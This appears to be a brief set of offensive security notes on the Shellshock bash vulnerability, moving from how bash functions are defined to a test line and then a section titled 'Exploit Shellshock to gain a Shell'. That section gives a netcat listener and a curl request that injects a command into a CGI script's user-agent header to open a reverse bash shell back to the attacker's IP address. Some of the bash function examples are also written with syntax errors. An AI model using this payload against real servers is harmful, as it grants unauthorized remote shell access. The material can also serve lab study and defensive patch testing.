# Shellshock

## Bash functions

* Can be defined in "one liners"

```text
$ welcome() {echo "Hi $USER"; }
```

Type welcome:

```text
$ welcome
```

Output:

> Hi user

* Can be defined in environment variables

```text
$export hellofunc="() {echo "Hi $USER"}"
```

```text
$bash -c 'hellofunc'
```

## Shellshock

```text
> env val='() { : ;}; echo vulnerable' bash -c "echo test"
```

## Exploit Shellshock to gain a Shell

### Turn on a netcat listener on attacker machine

```text
> netcat -nlvp 443
```

### Use curl send a request

```text
> curl -H "user agent: () { : ;};echo;/bin/nc -e /bin/bash [yourIPaddress] 443" [targetIPaddress]/cgi-bin/vulnerable.cgi
```

